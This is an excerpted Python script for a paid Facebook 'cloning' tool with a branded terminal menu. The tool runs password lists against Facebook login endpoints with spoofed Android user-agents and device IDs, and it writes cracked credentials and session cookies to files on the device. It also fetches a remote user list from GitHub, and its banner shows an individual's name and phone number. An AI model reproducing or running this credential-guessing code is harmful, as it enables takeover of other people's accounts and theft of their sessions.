...
os.system('xdg-open https://www.facebook.com/profile.php?id=100069459772723/')
...
try:
        ...
        os.system('pip install futures==2 && python RIP.py')
...
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/ZeaSabirTx/AFG.PRO/main/AFG.PRO.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
\033[1;32m+==================================================+
|     𝙊𝙒𝙉𝙀𝙍 :Himesh
|  𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 :?Himesh bhandari
|  𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 :+9779749361370
|   𝙏𝙊𝙊𝙇'𝙎  :𝙋𝘼𝙄𝘿👌
|   𝙑𝙀𝙍𝙎𝙄𝙊𝙉 :9.0
+==================================================+""")
def linex():
...
def menu():
			clear()
			print('\033[1;37m [1] Start Fb cloning\n [0] Exit menu')
			linex()
			zd=input(' Choose an option: ')
			if zd in ['1','01']:
				clear()
			...
			if xd in ['1','01']:
				...
				try:
					...
					menu()
				clear()
				print(' \033[1;37mAll method working ')
				linex()
...
def api1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [RIP-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"', 'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"', 'cache-control': 'max-age=0', 'dpr': '2', 'save-data': 'on', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-model': '"RMX1911"', 'sec-ch-ua-platform': '"Android"', 'sec-ch-prefers-color-scheme': 'light', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-ch-ua-platform-version': '"10.0.0"', 'accept-language': 'en-NZ,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [RIP-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/RIP-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/RIP-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[RIP-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m [RIP-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [RIP-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Dalvik/2.1.0 (Linux; U; Android 10; RMX1911 Build/QKQ1.200209.002) [FBAN/MobileAdsManagerAndroid;FBAV/application_version;FBBV/application_version_code;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+str(random.randint(000000000,999999999))+';FBMF/realme;FBBD/realme;FBDV/RMX1911;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1456};FB_FW/1;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
